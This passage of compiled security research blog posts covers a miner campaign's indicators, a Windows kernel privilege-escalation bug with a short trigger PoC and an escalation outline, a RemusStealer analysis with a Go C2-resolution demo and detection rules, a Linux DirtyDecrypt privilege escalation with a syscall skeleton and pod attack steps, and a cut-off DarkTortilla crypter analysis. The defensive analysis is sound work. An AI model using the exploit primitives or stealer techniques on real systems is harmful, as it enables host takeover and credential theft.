For network-based detection, the C2 IP `152.36.128.18` hitting `/cgi-bin/p.cgi` is a reliable indicator for current campaign variants. The HTTP GET to `103.41.204.104/k.php` is the download channel. Both should be in your blocklists.

**Mitigations**

Disable SSH password authentication entirely. Key-based auth removes the brute-force vector in one change. Patch MS17-010 if any Windows boxes remain unpatched (they do, I keep seeing them in engagements). Monitor CPU usage anomalies for unexpected spikes, which are often the first observable sign of a miner on a system that has not been fully hardened. And build that JSON trailer check into your malware pipeline so UPX-packed samples with appended config blobs do not slip through unpacked.

The campaign is active. The technique is reproducible across new variants. Worth making sure your detections cover this specific packing pattern.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="035" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2026-40369: One Syscall, Any Sandbox, Full SYSTEM
DATE       : 2026-05-28
URL        : https://garrettstimpson.ca/posts/2026/05/28/cve-2026-40369-windows-kernel-sandbox-escape/
CVE        : cve-2026-40369, CVE-2026-40369
CATEGORIES : exploits, windows
TAGS       : windows-kernel, lpe, sandbox-escape, ntquerysysteminformation, pwn2own, cve-2026-40369
WORD_COUNT : 1134
EXCERPT    : A Windows kernel bug that a rejected Pwn2Own researcher just dumped publicly lets any process, including a sandboxed Chrome renderer, walk straight to SYSTEM with a single syscall.
</FRONTMATTER>
<BODY>
There's something particularly satisfying about a vulnerability that requires no heap spray, no race condition, no DKOM magic. Just one syscall, a zero-length buffer, and a logic error that's been sitting in ntoskrnl.exe waiting for someone to notice it. CVE-2026-40369 is that bug.

## The Backstory

Researcher Ori Nimron built this for Pwn2Own Berlin 2026. The contest filled to capacity before his submission could be accepted. So he did what any self-respecting vulnerability researcher does when rejected: he dropped the full exploit chain publicly on GitHub (orinimron123/CVE-2026-40369-EXPLOIT), complete with a basic PoC, a full LPE, and a variant that models the Chrome sandbox environment. Pwn2Own Berlin 2026 paid out $1.29 million across 47 zero-days. This one didn't make the cut on logistics, not merit.

Microsoft patched it in the May 12, 2026 Patch Tuesday update. Affected builds include Windows 11 24H2 and 25H2, confirmed vulnerable at builds 26200.8039, 26200.8117, 26200.8246, and 26200.8328. Windows Server 2025 is also in scope. If you haven't applied May's cumulative update, you have a problem.

## The Root Cause

The bug lives in `ExpGetProcessInformation` inside `ntoskrnl.exe`. Specifically in how it handles `NtQuerySystemInformation` information class 253, `SystemProcessInformationExtension`.

Here's the key sequence. When `NtQuerySystemInformation` is called, `ExpQuerySystemInformation` runs `ProbeForWrite(buffer, Length, alignment)` before dispatching to the class-specific handler. That call is a complete no-op when `Length` is zero because the entire function body is gated on `if (Length)`. So passing a raw kernel address with `Length=0` gets through ProbeForWrite without a single check.

Then inside `ExpGetProcessInformation`, the code for class 253 sets `v95 = userBuffer` without any null or user-space validation. Classes 5 and 252 handle this correctly with their own variables and NULL checks. Class 253 doesn't. The process iteration loop then runs for every process on the system and executes:

```c
++*v95;               // *(uint32*)(addr+0) += 1 per process
v95[1] += threadCnt;  // *(uint32*)(addr+4) += active thread count
v95[2] += handleCnt;  // *(uint32*)(addr+8) += handle count
```

There's a length check that sets `STATUS_INFO_LENGTH_MISMATCH` when the buffer is too small, but that check does not cause an early return. The function stores the error status and continues iterating anyway. Every process on the system incrementing your target address before the function finally returns.

That's the primitive: deterministic increment of three DWORDs at any kernel address you supply, executed once per running process. On a typical Windows 11 system with 150-200 processes, you get a predictable, controllable increment value.

## The PoC

Minimal reproducer, no privileges required, no special tokens:

```c
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

typedef long NTSTATUS;
#define SystemProcessInformationExtension 253

typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

int main(void)
{
    PNtQuerySystemInformation pNtQSI = (PNtQuerySystemInformation)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    PVOID target = (PVOID)0xffff800041424344ULL;
    ULONG needed = 0;

    NTSTATUS status = pNtQSI(
        SystemProcessInformationExtension,
        target,   /* kernel address -- ProbeForWrite skipped, Length=0 */
        0,        /* Length=0 bypasses ProbeForWrite entirely */
        &needed
    );

    printf("[*] Status: 0x%08lX, Required: %lu\n", status, needed);
    return 0;
}
```

On an unpatched build, that kernel address takes the hit. On a patched build, ProbeForWrite now correctly rejects the request.

## Why the Sandbox Part Matters

This is what got me when I read through the full README. `NtQuerySystemInformation` is not restricted by Win32k lockdown. It is not filtered by the restricted token applied to Chrome, Edge, or Firefox renderer processes. Untrusted integrity level doesn't block it either.

What that means in practice: a compromised browser renderer, running with almost no privileges at all, can call this syscall directly. There's no additional exploit step needed to reach the vulnerable code path. You land in a renderer, you call `NtQuerySystemInformation(253, kernelAddr, 0, &needed)`, and you start incrementing kernel memory.

The full chain requires a KASLR leak to know what to target. Nimron's repo points to the prefetch-tool at `github.com/exploits-forsale/prefetch-tool` for that step. Once you've resolved kernel base and located your target structures, the increment primitive lets you walk through the rest of the chain.

The full LPE path Nimron documented goes like this. First, the increment primitive targets `CmpLayerVersions` to corrupt internal kernel pointers so they point into attacker-controlled user-space memory. Then controlled kernel reads extract the `EPROCESS` structure for the current process. From there, the token's privilege bitmask can be walked to the offset containing `SeDebugPrivilege`. Increment that bitmask into an enabled state. Open a handle to `winlogon.exe` with `OpenProcess`. Inject. Spawn a shell. Windows confirms `NT AUTHORITY\SYSTEM`.

The fact that Windows doesn't enforce Supervisor Mode Access Prevention (SMAP) on x64 here means the kernel happily processes user-space-mapped fake structures without fault. That simplifies the whole chain considerably since you don't need to allocate kernel memory for your fake objects.

## Patch Status and Detection

Microsoft's fix for this came in the May 12, 2026 Patch Tuesday update under KB5058411 for Windows 11 24H2 and KB5058405 for 25H2. The fix adds a proper bounds check inside `ExpGetProcessInformation` for class 253, ensuring the buffer pointer is validated independently of the `ProbeForWrite` result before entering the process iteration loop.

Detection is straightforward if you're monitoring syscalls. Any process calling `NtQuerySystemInformation` with information class 253 and a `SystemInformationLength` of zero is almost certainly up to something. That combination has no legitimate use. Stack the detector on anything running at untrusted or low integrity and you'll catch the PoC immediately.

For EDR teams, the process iteration that follows will produce a burst of writes from `nt!ExpGetProcessInformation+0x42e` to a fixed target address, which creates a distinctive memory access pattern even before the SYSTEM shell spawns.

## Mitigation

Apply KB5058411 (Windows 11 24H2) or KB5058405 (25H2) from the May 2026 Patch Tuesday. There is no meaningful workaround short of that patch. You can not disable `NtQuerySystemInformation` without breaking a substantial amount of software. The patch is the fix.

For environments where immediate patching isn't possible, restrict process creation for browser components via Job Objects and monitor for the specific syscall pattern above. Also confirm your endpoint agent is actually intercepting `NtQuerySystemInformation` calls at untrusted integrity level, because several agents filter at a higher level and would miss this entirely.

What gets me about this bug is how mundane the root cause is. An information class added to a syscall that's been in Windows since NT 3.1, a missing NULL check on one variable in one branch, and the entire ProbeForWrite defense collapses because the caller controls the length. Ten years of auditing the Windows kernel attack surface and this is the kind of thing that slips through.

Apply the patch. Check your builds. The full exploit code is public.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="036" type="security-research-post">
<FRONTMATTER>
TITLE      : RemusStealer on MalwareBazaar Today: Go Injector, Blockchain C2, and the ABE Bypass Chrome Still Can't Stop
DATE       : 2026-05-27
URL        : https://garrettstimpson.ca/posts/2026/05/27/remusstealer-go-injector-abe-bypass-etherhiding/
CVE        : none
CATEGORIES : malware, analysis
TAGS       : RemusStealer, LummaStealer, process-injection, EtherHiding, ABE-bypass, golang, mitre-attack, infostealer
WORD_COUNT : 1887
EXCERPT    : RemusStealer, a signed Go-based infostealer descended from Lumma, landed on MalwareBazaar fresh this morning using blockchain-backed C2 resolution and a shellcode injection trick that strips Chrome's Application-Bound Encryption straight from browser memory.
</FRONTMATTER>
<BODY>
Fresh off the MalwareBazaar browse queue this morning: a cluster of RemusStealer samples distributed from the `hippamsas-com` C2 domain, all first-seen within a two-hour window. The sample I'm working from is `84705a48cd1e868dc45ca6f42d565cf1c2a3c44def8fe25f7f15e5b3962bc5e8`, a 7.1MB Win64 PE timestamped 10:53 UTC today. It carries a code-signing certificate issued to www.sjabr.org (serial `06036922e36f40a6911679792abaafe28cd2`, valid May 8 through August 6, 2026), meaning it walks past naive signature-based defenses with a plausible-looking trust chain. A companion from the same campaign, `cdd16fc0a2bf1499ba815bc95288456e46c7245b64c9d06033f2c61eb06900f5`, carries an explicit `go` tag on Bazaar and hits ReversingLabs' Win64.Trojan.GoInject classification, confirming the delivery binary is Go-compiled. Six other samples in MalwareBazaar share the same rogue signing certificate.

MalwareBazaar entry: https://bazaar.abuse.ch/sample/84705a48cd1e868dc45ca6f42d565cf1c2a3c44def8fe25f7f15e5b3962bc5e8/

Remus has been active since early 2026, appearing shortly after Lumma Stealer's core operators were publicly identified between August and October 2025. Gen Threat Labs traced the lineage through intermediate builds labeled "Tenzor," compiled September 2025, which bridge earlier Lumma samples directly to current Remus binaries. The code continuity is not subtle: matching string obfuscation schemes, identical anti-VM logic, the same ChaCha20 config decryption layout, and a very specific Application-Bound Encryption bypass technique that, until Remus appeared, had only ever been seen in Lumma. This is a 64-bit native branch of the same codebase, not a copycat.

## What makes it work

The attack chain starts with a web download from hippamsas-com infrastructure. The binary is signed, 7MB, and Go-compiled, which already creates friction for analysis tools tuned to conventional C/C++ stealers. The techniques inside are where it gets interesting.

Remus hides its strings by assembling encrypted values on the stack using `mov` instruction sequences, then decoding each one with a per-string Mixed Boolean-Arithmetic (MBA) loop. MBA obfuscation produces mathematically equivalent but syntactically bizarre expressions like `((x ^ 0xDEAD) + 0x1234) & 0xFF` to represent a simple constant. It is not compression or XOR-with-key. These loops are specifically designed to defeat symbolic execution and pattern-matching deobfuscators, and they are padded with atypical `nop` sequences that show up identically in Lumma samples. C2 configuration, encrypted blobs, keys, and nonces, lives in `.rdata` and is decrypted at runtime with ChaCha20.

Rather than importing Windows APIs through the Import Address Table, Remus resolves them by CRC32-hashing export names in `ntdll.dll` at runtime and dispatching calls through a direct sysenter stub. This sidesteps usermode API hooks placed by EDR products, since the call never touches the monitored stub functions. Sysmon and ETW-based telemetry survive this. Many endpoint agents hooking `NtCreateProcess`, `NtWriteVirtualMemory`, and related functions at the usermode layer do not.

The C2 resolution technique is where Remus breaks from the commodity stealer mold. Old Lumma builds used dead drop resolvers on Steam profiles and Telegram channels, storing ROT-15 obfuscated C2 URLs in publicly accessible web content. Remus replaces that with EtherHiding. The malware issues an `eth_call` JSON-RPC request to a hardcoded Ethereum smart contract through a public RPC endpoint, then decodes the C2 address from the hex-encoded return data. Because Ethereum smart contract state is decentralized and effectively immutable from a takedown perspective, there is no domain to sinkhole, no account to ban, and no infrastructure to seize. The operator updates the embedded C2 by calling the contract, and every infected machine resolves the new value on next check-in. It's a genuinely clever piece of operational security.

The ABE bypass is the most technically dense part. Chrome's Application-Bound Encryption, introduced in Chrome 127, wraps the local database encryption key using DPAPI with a machine-bound identity specifically to prevent other processes from decrypting it. Remus sidesteps this by injecting a compact shellcode of roughly 51 bytes into the live browser process, where it inherits the browser's own process identity. Inside that context, the shellcode locates `dpapi.dll`, resolves `CryptUnprotectMemory` via export hash, and then scans `chrome.dll` for a specific opcode pattern leading to the `os_crypt_async::Encryptor` vtable that holds the protected key. Once it locates the vtable, it walks memory for object instances, extracts the `v20_master_key` at a known offset, copies it to a pre-allocated buffer, and calls `CryptUnprotectMemory` with the `CRYPTPROTECTMEMORY_SAME_PROCESS` flag. The key decrypts in-process. The result is the plaintext master key, which decrypts every cookie, saved password, and autofill entry in Chrome's `Login Data` SQLite database. MFA tokens stored as cookies come with it.

If injection fails or no browser is running, Remus falls back to calling `CreateDesktop` to spin up a hidden desktop, launching Chrome there to avoid any visible window, and using SYSTEM token impersonation as an alternate ABE unlock path (T1134.001).

The sandbox evasion is thorough. Remus checks CPUID leaf `0x40000000` for hypervisor brand strings, scanning for VMware's `VMwareVMware`, VirtualBox's `VBoxVBoxVBox`, KVM's `KVMKVMKVM`, and Xen signatures in the same order and with similarly obfuscated comparison constants as Lumma (T1497.001). On top of that, it runs a CRC32 scan of loaded DLLs hunting for modules associated with Avast Sandbox, Sandboxie, and Comodo. It also checks for a honeypot PST file, specifically a fake Outlook archive that some automated sandboxes place on disk. If either check triggers, the binary terminates silently with no network activity. It just looks like a crash.

## Educational sample: EtherHiding C2 resolution in Go

The most defensively useful technique to understand here is EtherHiding. Knowing what the malware's blockchain-based DNS equivalent looks like helps build network-layer detections. The snippet below demonstrates the mechanism with no malicious payload and no real C2 interaction.

```go
// EDUCATIONAL SAMPLE -- demonstrates the EtherHiding C2 resolution technique
// This does NOT contain any malicious payload
// For research and defensive awareness only
//
// Shows how malware can use a public Ethereum RPC endpoint to resolve a C2 address
// embedded in smart contract storage, rather than traditional DNS or a hardcoded domain.
// In a real stealer, the contract address and RPC endpoint are decrypted from .rdata
// at runtime using ChaCha20 with a per-sample key.

package main

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
)

// In production malware, both values below are decrypted at runtime from .rdata.
// Using a nonexistent placeholder contract address here for safety.
const (
	contractAddr = "0x0000000000000000000000000000000000000001" // placeholder, not real
	rpcEndpoint  = "https://cloudflare-eth.com"               // public RPC, no malicious use
)

type ethCallRequest struct {
	JSONRPC string        `json:"jsonrpc"`
	Method  string        `json:"method"`
	Params  []interface{} `json:"params"`
	ID      int           `json:"id"`
}

// resolveC2FromChain simulates how EtherHiding reads C2 data from a smart contract.
// The returned hex-encoded contract state decodes to the C2 address string.
// Real samples apply a second ChaCha20 decryption pass on the decoded bytes.
func resolveC2FromChain(contract, rpc string) (string, error) {
	// ABI function selector for a simple get() view function.
	// Actual malware uses a contract-specific selector decoded from obfuscated config.
	callData := "0x6d4ce63c"

	req := ethCallRequest{
		JSONRPC: "2.0",
		Method:  "eth_call",
		Params: []interface{}{
			map[string]string{
				"to":   contract,
				"data": callData,
			},
			"latest",
		},
		ID: 1,
	}

	body, _ := json.Marshal(req)
	resp, err := http.Post(rpc, "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("RPC request failed: %w", err)
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	hexData, ok := result["result"].(string)
	if !ok {
		return "", fmt.Errorf("unexpected RPC response shape")
	}

	// Strip the "0x" prefix and hex-decode.
	// In the wild this produces a null-terminated ASCII C2 hostname or IP:port string.
	raw, err := hex.DecodeString(strings.TrimPrefix(hexData, "0x"))
	if err != nil {
		return "", fmt.Errorf("hex decode failed: %w", err)
	}

	return strings.TrimRight(string(raw), "\x00"), nil
}

func main() {
	fmt.Println("[educational demo] Resolving C2 from Ethereum contract storage...")
	addr, err := resolveC2FromChain(contractAddr, rpcEndpoint)
	if err != nil {
		fmt.Println("Could not resolve:", err)
		return
	}
	fmt.Println("Decoded contract data:", addr)
}
```

The key detection implication: this produces outbound HTTPS POST requests to a public Ethereum JSON-RPC provider on port 443, not the usual RPC port 8545. Any process that is not a crypto wallet, blockchain node, or development tool making `eth_call` requests to `cloudflare-eth.com`, `rpc.ankr.com`, `mainnet.infura.io`, or similar endpoints is worth immediate investigation. The request body will contain `"method":"eth_call"` with a `"to"` address and a `"data"` field, which makes it identifiable in proxy or DPI logs regardless of TLS if you're doing full packet inspection.

## Detection and defense

A YARA rule targeting the family's behavioral fingerprint:

```yara
rule RemusStealer_Go_EtherHiding
{
    meta:
        description = "Detects RemusStealer Go injector with EtherHiding C2 and ABE bypass indicators"
        author      = "Garrett Stimpson"
        date        = "2026-05-27"
        reference   = "https://bazaar.abuse.ch/sample/84705a48cd1e868dc45ca6f42d565cf1c2a3c44def8fe25f7f15e5b3962bc5e8/"
        hash1       = "84705a48cd1e868dc45ca6f42d565cf1c2a3c44def8fe25f7f15e5b3962bc5e8"
        hash2       = "cdd16fc0a2bf1499ba815bc95288456e46c7245b64c9d06033f2c61eb06900f5"

    strings:
        $eth_call     = "eth_call"              ascii nocase
        $jsonrpc      = "jsonrpc"               ascii
        $latest       = "\"latest\""            ascii
        $go_runtime   = "runtime.GOMAXPROCS"    ascii
        $vmware       = "VMwareVMware"          ascii
        $vbox         = "VBoxVBoxVBox"          ascii
        $kvm          = "KVMKVMKVM"             ascii
        $c2_campaign  = "hippamsas"             ascii nocase
        $chacha       = "chacha20"              ascii nocase

    condition:
        uint16(0) == 0x5A4D
        and filesize > 4MB and filesize < 12MB
        and $go_runtime
        and (
            ($eth_call and $jsonrpc and $latest)
            or ($c2_campaign)
            or (2 of ($vmware, $vbox, $kvm) and $chacha)
        )
}
```

The Sysmon events that matter most here are process access (Event ID 10), file creation (Event ID 11), and image load (Event ID 7). On Event ID 10, flag any non-browser, non-system process requesting `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ` access on `chrome.exe` or `msedge.exe`. That exact access mask is needed to inject the ABE bypass shellcode and normal system behavior does not include cross-process browser memory writes. On Event ID 11, watch for short-lived SQLite database copies or files named `Processes.txt` created in `%TEMP%` or `%APPDATA%\Local\Temp` by a recently-executed unsigned PE. On Event ID 7, a `dpapi.dll` image load attributed to `chrome.exe` with an unusual initiating call stack (one that traces back through injected shellcode rather than a Chrome internal) is a strong secondary indicator.

For network detection, a Sigma rule on proxy or firewall logs targeting HTTPS POSTs to known Ethereum RPC providers from non-wallet processes is the highest-value detection for EtherHiding. The HTTP body will be JSON with `"method":"eth_call"`, and no legitimate browser, Office application, or general-purpose tool makes this call.

Mitigating the ABE bypass at the OS level is possible but requires some work. Enabling `PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS` on browser processes via Windows Defender Application Control blocks the shellcode write to browser memory. The Microsoft Attack Surface Reduction rule for blocking process injection (GUID `75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84`) will catch many injection paths. For the code signing evasion, adding a WDAC policy that requires certificates from a specific trusted root rather than allowing any valid EV cert will prevent rogue certs like the sjabr.org one from getting through. The CA that issued it (listed as "Issuer: E8" in the Bazaar entry) is worth monitoring for other recently-issued certs appearing in this campaign, since RemusStealer operators appear to be burning through short-lived signing certs roughly every 90 days.

Six samples in MalwareBazaar now share the same certificate thumbprint `eae49c47a0dde758f20b3bf6616579b11461873a072d371578eb42282f269277`. Blocking on that thumbprint is a quick defensive win until the next cert rotation.

MITRE ATT&CK coverage for this sample: T1027.010 (MBA string obfuscation), T1055 (process injection into Chrome), T1553.002 (rogue code signing certificate), T1497.001 (CPUID anti-VM), T1555.003 (credentials from web browsers), T1134.001 (SYSTEM token impersonation for hidden desktop fallback), T1071 (EtherHiding via Ethereum JSON-RPC as application layer protocol).
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="037" type="security-research-post">
<FRONTMATTER>
TITLE      : DirtyDecrypt (CVE-2026-31635): How a Missing COW Guard in rxgk_decrypt_skb Hands You Root
DATE       : 2026-05-27
URL        : https://garrettstimpson.ca/posts/2026/05/27/dirtydecrypt-cve-2026-31635-rxgk-linux-lpe/
CVE        : CVE-2026-31635, cve-2026-31635, CVE-2026-43500
CATEGORIES : exploits, linux
TAGS       : cve-2026-31635, dirtydecrypt, linux-kernel, lpe, kubernetes, rxgk, page-cache, poc
WORD_COUNT : 1499
EXCERPT    : A missing copy-on-write guard in Linux's RxGK subsystem lets any local user corrupt arbitrary page-cache pages and get root, no race condition required.
</FRONTMATTER>
<BODY>
Third one in three weeks. At this point the Linux kernel's network-adjacent decryption paths are starting to feel less like hardened kernel code and more like a vulnerability hotline. Copy Fail dropped April 29. Dirty Frag came a week later. And now on May 18, 2026, Luna Tong and the V12 team published a working PoC for DirtyDecrypt, CVE-2026-31635, a local privilege escalation hiding inside the RxGK subsystem that most people have never heard of, running on distros they almost certainly use.

This one gets under my skin for a few reasons. The bug class is similar to the others but the trigger surface is different enough to matter operationally. And the CVE attribution is a mess that deserves some unpacking before you go building detection around it.

## What RxGK Actually Is

RxGK is the GSS-API-based security layer for RxRPC, the transport protocol used by the Andrew File System client (`afs.ko`). Nobody uses AFS in production anymore. The module is still compiled into every mainline kernel and most rolling-release distributions, because `CONFIG_RXGK=y` in the build config says nothing about whether `rxrpc` is loaded at runtime. It only loads when userspace touches the AFS code path. Or when you call `modprobe rxrpc`. That second part is the problem.

The vulnerable function is `rxgk_decrypt_skb()`. This sits on the receive path and handles decryption of incoming socket buffers (`sk_buff`). The specific call chain during a connection setup RESPONSE packet is:

```
rxgk_verify_response()
  → rxgk_extract_token()
    → rxgk_decrypt_skb()
      → skb_to_sgvec()
        → crypto_krb5_decrypt()
```

The kernel receives a packet, builds a scatterlist from the sk_buff pages, and decrypts in place. The problem is that those pages may be aliased into the page cache of other files via `MSG_SPLICE_PAGES`. Before decryption happens, the kernel should check whether those pages are privately owned or shared, and if shared, create a private copy before writing the decrypted bytes. That copy-on-write guard is not there. The decrypt writes go straight into whatever memory backs those shared pages, which could be `/etc/shadow`, `/etc/sudoers`, a SUID binary, or any other privileged file.

V12 describes it plainly: "rxgk pagecache write due to missing COW guard in `rxgk_decrypt_skb`." The full mechanism from the Delphos Labs analysis (Kamil Leoniak, 15 May 2026) is a bit sharper. It's not just a missing guard. It's decrypt-before-MAC over `MSG_SPLICE_PAGES`-aliased scatterlist pages, combined with an AES-CBC chosen-plaintext primitive that an attacker can drive through an attacker-controlled server key. No brute force. No timing window. You control the input well enough to write predictable bytes to the target page.

That is why there is no race condition here. Copy Fail needed precise timing. DirtyDecrypt does not. You set up the socket, feed it the right RESPONSE packet, and the kernel does the work.

## The CVE Attribution Problem

Here is where things get annoying. The NVD entry for CVE-2026-31635 describes a different, related bug in the same code path: an inverted length check in `rxgk_verify_response()` that lets oversized RESPONSE authenticator lengths flow through to `skb_to_sgvec()`, where the kernel trips a `BUG_ON(len)`. The NVD CVSS vector for that entry reads `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`, which is a remote DoS, not a privilege escalation. The fix commits listed in the NVD record are `a2567217`, `beee051f`, and `e2f1a80d`, all published on 24 April 2026.

The LPE path, the one the V12 PoC actually exercises, is linked to CVE-2026-31635 only because the NVD record contains a link to the V12 PoC. There is no separate CVE number for DirtyDecrypt as of this writing. The effective fix for the LPE is commit `aa54b1d27fe0`, authored 8 May and committed 10 May 2026, which copies packets with shared fragments before in-place decryption. That commit is separately tied to the RxRPC side of Dirty Frag (CVE-2026-43500).

So: two bugs, same code path, same CVE number, different fix commits, different CVSS vectors. Track both commits if you are writing detection or patch validation logic.

## Who Gets Hit

The short version: if your system has `CONFIG_RXGK=y` or `CONFIG_RXGK=m` in the kernel config and you have not applied the 25 April stable patches or commit `aa54b1d27fe0`, you are vulnerable.

```bash
# Check your build config
grep RXGK /boot/config-$(uname -r)
# or
zcat /proc/config.gz | grep RXGK
```

If that returns `CONFIG_RXGK=y` or `CONFIG_RXGK=m`, you need to patch or apply the module blacklist workaround. If it returns `# CONFIG_RXGK is not set` or nothing at all, you are safe. Debian Stable, RHEL, and Ubuntu LTS standard kernels typically have RxGK disabled. Fedora, Arch Linux, and openSUSE Tumbleweed do not.

The higher-risk population in practice is Kubernetes workers. An attacker who gets code execution inside a container on a Fedora CoreOS Rawhide worker node can:

```bash
# From inside a compromised pod
grep RXGK /boot/config-$(uname -r)   # Check host via /proc or /host mount
modprobe rxrpc                         # Load the module
# Run PoC, get root on the host
# Now you have the container runtime socket, all secrets mounted on this node, 
# access to every other pod running here
```

Root on a Kubernetes worker is not just root on one machine. It's every secret stored on that node, every service account token, every pod running alongside you. That escalation path is what the CISA KEV addition for Copy Fail was really signaling, and DirtyDecrypt shares the same logic.

## Proof of Concept

The V12 PoC is publicly available in the NVD record for CVE-2026-31635 and on GitHub. The core syscall sequence looks roughly like this. I am not reproducing the full exploit, but the shape is:

```c
// Attacker opens a socket and acts as an RxRPC server
int fd = socket(AF_RXRPC, SOCK_SEQPACKET, PF_INET);

// Bind to a local port
struct sockaddr_rxrpc srx = { ... };
bind(fd, (struct sockaddr *)&srx, sizeof(srx));

// Client initiates connection, sends RESPONSE packet
// Server-side (attacker controls the "server" in local namespace)
// rxgk_verify_response() → rxgk_extract_token() triggers decryption
// AES-CBC chosen-plaintext: craft key material so decrypted bytes 
// hit the page cache page of the target file at the target offset
// Result: controlled 4-byte write to privileged file without COW guard
```

The AES-CBC chosen-plaintext aspect is what makes this deterministic. You control the server-side key material during the RESPONSE handshake. The kernel decrypts your data directly into the aliased page cache page. No timing. No retry loop. One shot.

## Mitigation

Patch first. If you cannot patch today, blacklist the modules.

**Patch path:**

```bash
# Fedora
sudo dnf upgrade --refresh kernel kernel-core kernel-modules
sudo systemctl reboot

# Arch Linux
sudo pacman -Syu linux linux-headers
sudo systemctl reboot

# openSUSE Tumbleweed
sudo zypper dup
sudo systemctl reboot
```

Target kernel build date: after 25 April 2026. Or verify that commit `aa54b1d27fe0` is in the running kernel's git ancestry if you are building from source.

**Module blacklist workaround (if you cannot reboot today):**

```bash
# Create the blacklist file
sudo tee /etc/modprobe.d/no-rxgk.conf > /dev/null <<'EOF'
# Temporary DirtyDecrypt mitigation, CVE-2026-31635
# Remove after kernel patch is applied
blacklist rxrpc
blacklist esp4
blacklist esp6
install rxrpc /bin/false
install esp4 /bin/false
install esp6 /bin/false
EOF

# Unload currently active modules
sudo modprobe -r rxrpc esp4 esp6 2>&1

# Drop caches and rebuild module dependency map
sudo depmod -a
sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches

# Verify nothing is loaded
lsmod | grep -E "(rxrpc|esp4|esp6)" && echo "STILL LOADED" || echo "Clean"
```

Fair warning: blacklisting `esp4` and `esp6` breaks IPsec. StrongSwan, libreswan, anything running a site-to-site tunnel goes down. WireGuard is unaffected. Check your VPN topology before applying this in production.

**Kubernetes worker nodes:**

If your worker image is based on Fedora CoreOS Rawhide or an Arch-based custom build, force a node image rebuild now and drain the old nodes. If you are on Talos Linux, `talosctl upgrade --image ghcr.io/siderolabs/installer:v1.10.5` replaces the entire host image including the kernel. Bottlerocket and Flatcar Stable workers are not affected in their default kernel configurations.

While you are in the cluster doing this, enforce `allowPrivilegeEscalation: false` and `runAsNonRoot: true` as pod-level defaults if you have not already. They do not stop DirtyDecrypt from executing if the attacker has a shell on the host, but they reduce the surface that gets you to that shell in the first place.

---

The thing that stands out about this whole "Dirty" family, Copy Fail, Dirty Frag, DirtyDecrypt, is that none of these bugs are exotic. They are missing checks in code paths that clearly should have checks. The page cache is a known shared resource. COW semantics are foundational. The fact that three separate kernel subsystems shipped decryption-path code without proper COW guards in the same six-month window suggests the audit coverage here was thin. I would not be surprised if there is a fourth one. Run your kernel config sweeps now, not after it ships.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="038" type="security-research-post">
<FRONTMATTER>
TITLE      : DarkTortilla Wraps DarkCloud: How a .NET Crypter Hides a Credential Stealer in a Fake Quotation Email
DATE       : 2026-05-27
URL        : https://garrettstimpson.ca/posts/2026/05/27/darktortilla-darkcloud-net-crypter-credential-stealer/
CVE        : none
CATEGORIES : malware, analysis
TAGS       : darktortilla, darkcloud, dotnet, infostealer, reflective-loading, mitre-attack
WORD_COUNT : 1646
EXCERPT    : A DarkTortilla-packed .NET executable dropped on MalwareBazaar today carries a DarkCloud stealer payload that weaponizes reflective Assembly.Load() to run entirely in memory, bypassing AV and dumping browser credentials before you notice it launched.
</FRONTMATTER>
<BODY>
A new sample hit MalwareBazaar this morning and it is a clean example of a two-layer attack that defenders routinely underestimate. The file, `Quotation No 550.exe`, arrived at 12:13 UTC on May 27, 2026, submitted by James_inthe_box. The outer layer is a DarkTortilla crypter, a .NET-based packer that has been quietly active since at least 2015. The inner payload, flagged by CAPE Sandbox, Intezer, and several others, is DarkCloud stealer.

SHA256: `82f667e77a036edce6b6bef25fbc989fbf1f27e1bdc3ddb99b821ca9f60dd10b`

Full MalwareBazaar entry: `https://bazaar.abuse.ch/sample/82f667e77a036edce6b6bef25fbc989fbf1f27e1bdc3ddb99b821ca9f60dd10b/`

One thing that stands out immediately is the imphash: `f34d5f2d4577ed6d9ceec516c1f5a744`. MalwareBazaar shows that same imphash across nearly 49,000 AgentTesla samples and almost 20,000 Formbook samples. That is not a coincidence. DarkTortilla is a malware-as-a-service crypter, and operators reuse the same .NET loader skeleton to wrap whatever payload they are distributing this week.

---

## What Makes It Work

The attack chain begins the way most credential theft operations do: a business-themed email. "Quotation No 550.exe" is designed to look like a legitimate procurement document, the kind of thing a purchasing manager opens without a second thought. The filename is the social engineering. Everything else is technical.

DarkTortilla is a two-stage .NET assembly. The initial loader, a standalone PE, does not execute the real payload directly. Instead, it reads an encrypted blob, usually embedded in a .NET resource or appended to the file, decrypts it with AES or a similar symmetric cipher, and then calls `Assembly.Load()` on the raw bytes. That single call is the trick. The .NET runtime loads the decrypted DLL into memory directly, no file is written to disk, no path shows up in Prefetch, no artifact lands in `%TEMP%`. The loaded DLL is the DarkTortilla "core processor," a second .NET assembly that handles everything else.

The core processor parses a configuration blob embedded within itself, which controls the behavior of the full infection chain. Before doing anything meaningful, it runs environment checks. DarkTortilla looks for common VM artifacts: MAC address prefixes associated with VirtualBox (`08:00:27`) and VMware (`00:0C:29`), registry keys under `HKLM\SOFTWARE\VMware, Inc.`, processor names containing "VBOX" or "VIRTUAL", and the presence of known analysis processes. If any check trips, the loader simply exits. This is T1497.001 (Virtualization/Sandbox Evasion: System Checks) and it works often enough that DarkTortilla has operated for over a decade without being widely burned.

